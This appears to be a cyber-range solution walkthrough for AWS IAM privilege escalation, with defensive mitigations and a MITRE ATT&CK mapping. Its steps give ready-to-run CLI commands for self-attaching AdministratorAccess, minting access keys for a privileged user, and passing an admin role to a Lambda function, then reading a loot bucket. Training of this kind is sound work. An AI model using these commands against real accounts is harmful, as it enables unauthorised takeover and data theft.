# Solution Walkthrough: IAM Privilege Escalation

## Scenario Summary

You have obtained a low-privilege AWS access key for the
`range-03-iam-privesc-low-priv-*` user. On the surface it can only read
IAM (it has `IAMReadOnlyAccess`). In reality it carries three inline
policies, each a documented IAM privilege-escalation primitive, that let
you climb from this foothold to full account access and read a secret in
an S3 bucket you have no direct access to. Your goal is to reach the flag
in the loot bucket.

Every technique below is drawn from **Rhino Security Labs' "AWS IAM
Privilege Escalation - Methods and Mitigation"** catalogue. These are
general, documented misconfigurations, not a re-enactment of one named
public breach.

---

## Step 1: Enumerate your access

Load the foothold credentials into a dedicated CLI profile and confirm
who you are.

```bash
export AWS_ACCESS_KEY_ID=<attacker_access_key_id>
export AWS_SECRET_ACCESS_KEY=<attacker_secret_access_key>
export AWS_DEFAULT_REGION=us-east-1

# Who am I?
aws sts get-caller-identity
# Note your user name from the ARN - you'll need it below.

# What IAM can I see? (IAMReadOnlyAccess)
aws iam list-users
aws iam list-policies --scope Local

# What is attached to ME? This is where you discover the three
# escalation primitives baked into your own user.
aws iam list-user-policies --user-name <your-low-priv-user-name>
aws iam get-user-policy --user-name <your-low-priv-user-name> --policy-name step1-self-policy-attach
aws iam get-user-policy --user-name <your-low-priv-user-name> --policy-name step2-create-access-key
aws iam get-user-policy --user-name <your-low-priv-user-name> --policy-name step3-passrole-lambda
```

You now know you can attach policies to yourself, create access keys for
anyone, and pass roles to Lambda. Any one of these is game over.

---

## Step 2: Escalate via self policy-attach

Your `step1-self-policy-attach` policy grants `iam:AttachUserPolicy` on
`*`. Attach `AdministratorAccess` to your own user:

```bash
aws iam attach-user-policy \
  --user-name <your-low-priv-user-name> \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Confirm it stuck
aws iam list-attached-user-policies --user-name <your-low-priv-user-name>
```

Your existing credentials are now account admin - no re-authentication
needed, the new permissions apply on the next call. This alone is enough
to reach the loot (skip to Step 4). Step 3 shows an independent path that
does not touch your own user, which is stealthier.

---

## Step 3: Escalate via CreateAccessKey on a higher-privileged user

Your `step2-create-access-key` policy grants `iam:CreateAccessKey` on `*`.
Find a more privileged user and mint yourself a key for it.

```bash
# Find the privileged victim (it has iam:*/s3:* but no key of its own)
aws iam list-users
aws iam list-user-policies --user-name <admin_target_user_name>

# Mint a brand-new access key FOR that user
aws iam create-access-key --user-name <admin_target_user_name>
# -> returns AccessKeyId + SecretAccessKey for the admin-target user
```

Load the victim's new key into a second profile and you are now operating
as that privileged identity:

```bash
aws configure set aws_access_key_id     <admin_target_access_key_id>     --profile victim
aws configure set aws_secret_access_key <admin_target_secret_access_key> --profile victim
aws configure set region                us-east-1                        --profile victim

aws --profile victim sts get-caller-identity
# -> now shows the admin-target user's ARN, not yours
```

No password reset, no MFA, no console session - just a fresh programmatic
credential for a user more powerful than you.

---

## Step 4: Collect the loot

As the escalated identity (admin via Step 2, or the victim via Step 3),
read the secret in the loot bucket:

```bash
# List buckets and find the loot bucket (range-03-iam-privesc-loot-*)
aws s3 ls

# Read the flag
aws s3 cp s3://<loot_bucket>/loot.txt - 
# -> You escalated successfully. Flag: {privesc_complete}
```

---

## Step 5: PassRole + Lambda CreateFunction

A third, independent path to full account access. The attacker holds
`iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction`, and the
`*-privileged-exec-role` carries `AdministratorAccess`. Create a Lambda, pass
that role to it as the execution role, and invoke it to run code as an admin:

```bash
# 1. Confirm the privileged role you can pass
aws iam get-role --role-name <project>-privileged-exec-role

# 2. Package a trivial function that reports its own (admin) identity
cat > index.py <<'PY'
import boto3
def handler(event, context):
    return boto3.client("sts").get_caller_identity()["Arn"]
PY
zip function.zip index.py

# 3. Create the function, PASSING the privileged role
#    (iam:PassRole + lambda:CreateFunction)
aws lambda create-function \
  --function-name privesc-poc \
  --runtime python3.12 \
  --role arn:aws:iam::<account-id>:role/<project>-privileged-exec-role \
  --handler index.handler \
  --zip-file fileb://function.zip

# 4. Invoke it - the code now runs with AdministratorAccess
aws lambda invoke --function-name privesc-poc out.json && cat out.json
```

Everything the function does now executes as the admin execution role,
independent of the Step 2 and Step 3 paths above.

---

## Why This Works

1. **Self policy-attach (Step 2)**: `iam:AttachUserPolicy` on
   `Resource = "*"` lets an identity grant itself any managed policy,
   including `AdministratorAccess`, with no approval step or separation of
   duties. "Can manage IAM" collapses into "is IAM admin".

2. **CreateAccessKey on another user (Step 3)**: `iam:CreateAccessKey` on
   `Resource = "*"` lets a caller mint long-lived credentials for *any*
   user. Because the action is not scoped to the caller's own user ARN, it
   is really "impersonate anyone" - and the new key is a quiet persistence
   mechanism that survives the victim's password reset.

3. **PassRole + Lambda (Step 5)**: `iam:PassRole` on `Resource = "*"` with
   no `iam:PassedToService` condition, combined with
   `lambda:CreateFunction`, lets an attacker run code as a role they could
   never assume directly. Compute launders "I can pass this role" into "I
   can execute with this role's permissions".

---

## Defensive Mitigations

| Vulnerability | Mitigation |
|---|---|
| `iam:AttachUserPolicy` on `*` (self policy-attach) | Scope the action to a specific, safe list of policy ARNs; attach a permissions boundary that caps the maximum privilege of the user regardless of what it attaches; deny attachment of `AdministratorAccess` and other high-privilege managed policies via SCP |
| `iam:CreateAccessKey` on `*` (mint keys for others) | Scope the resource to the caller's own user ARN (`arn:aws:iam::<acct>:user/${aws:username}`); alert on every `CreateAccessKey` call in CloudTrail, especially where the target user differs from the caller; prefer short-lived STS credentials over long-lived keys |
| `iam:PassRole` on `*` with no service condition | Add a `Condition` restricting `iam:PassedToService`; scope `Resource` to specific role ARNs safe to pass; separate "who may create Lambda functions" from "which roles may be passed" |
| Overly broad enumeration surface | `IAMReadOnlyAccess` is convenient but hands attackers a map; scope read access, and monitor for reconnaissance patterns (bulk `List*`/`Get*` on IAM) |
| No detective controls | Enable CloudTrail across all regions, alert on `AttachUserPolicy`, `CreateAccessKey`, `CreateFunction`+`PassRole` sequences, and run IAM Access Analyzer to surface these grants before an attacker does |

---

## MITRE ATT&CK Cloud Matrix Mapping

| Tactic | Technique |
|---|---|
| Initial Access | T1078.004 — Valid Accounts: Cloud Accounts |
| Discovery | T1069.003 — Permission Groups Discovery: Cloud Groups |
| Discovery | T1580 — Cloud Infrastructure Discovery |
| Privilege Escalation | T1098.003 — Account Manipulation: Additional Cloud Roles |
| Persistence / Privilege Escalation | T1098.001 — Account Manipulation: Additional Cloud Credentials |
| Execution | T1648 — Serverless Execution |
| Collection | T1530 — Data from Cloud Storage |
